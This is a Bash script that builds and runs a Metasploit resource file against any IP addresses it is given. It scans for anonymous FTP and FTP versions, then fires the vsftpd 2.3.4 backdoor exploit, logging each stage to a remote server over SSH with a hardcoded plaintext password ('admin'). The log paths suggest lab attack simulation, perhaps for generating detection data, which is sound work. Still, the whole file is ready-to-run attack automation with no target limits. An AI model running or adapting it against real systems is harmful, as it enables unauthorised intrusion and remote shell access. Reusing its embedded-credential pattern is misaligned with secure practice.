#!/bin/bash

if [ "$#" -eq 0 ]; then
  echo "Usage: $0 <ip_address1> [<ip_address2> ...]"
  exit 1
fi
# collect the number of IPs
num_IPs=$(( $# ))
sleep_time=$((10 * num_IPs))
# collect the IP adresses in IPs variable
IPs=""
for ip in "$@"; do
  IPs="$IPs $ip"
done
# log file path
log_path="/home/ubuntu/attack_logs/vsftp_exploit_log_$(date +'%Y-%m-%d_%H:%M:%S').log"
log_server="10.10.2.74"

# Create a resource script `msfconsole` to run the modules
# FTP scanning on the selected IPs
echo "use auxiliary/scanner/ftp/anonymous" > vsftp_exploit_msfconsole.rc
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') vsftp exploit : Anonymous Scanning \" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> vsftp_exploit_msfconsole.rc
echo "set RHOSTS $IPs" >> vsftp_exploit_msfconsole.rc
echo "exploit -j" >> vsftp_exploit_msfconsole.rc
# wait for exploit to finish
echo "sleep $sleep_time" >> vsftp_exploit_msfconsole.rc
# FTP version scanning
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') vsftp exploit : version Scanning \" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> vsftp_exploit_msfconsole.rc
echo "use auxiliary/scanner/ftp/ftp_version" >> vsftp_exploit_msfconsole.rc
echo "set RHOSTS $IPs" >> vsftp_exploit_msfconsole.rc
echo "exploit -j -z" >> vsftp_exploit_msfconsole.rc
# wait for exploit to finish
echo "sleep $sleep_time" >> vsftp_exploit_msfconsole.rc
# exploit vsftp
echo "use exploit/unix/ftp/vsftpd_234_backdoor" >> vsftp_exploit_msfconsole.rc
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') vsftp exploit : bruteforce \" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> vsftp_exploit_msfconsole.rc
echo "set RHOSTS $IPs" >> vsftp_exploit_msfconsole.rc
echo "set FTPPASS user" >> vsftp_exploit_msfconsole.rc
echo "exploit -j -z" >> vsftp_exploit_msfconsole.rc
# wait for exploit to finish
echo "sleep $sleep_time" >> vsftp_exploit_msfconsole.rc
# exit metasploit: -y to close the sessions before exiting
echo "exit -y" >> vsftp_exploit_msfconsole.rc  
# run metasploit
msfconsole -r vsftp_exploit_msfconsole.rc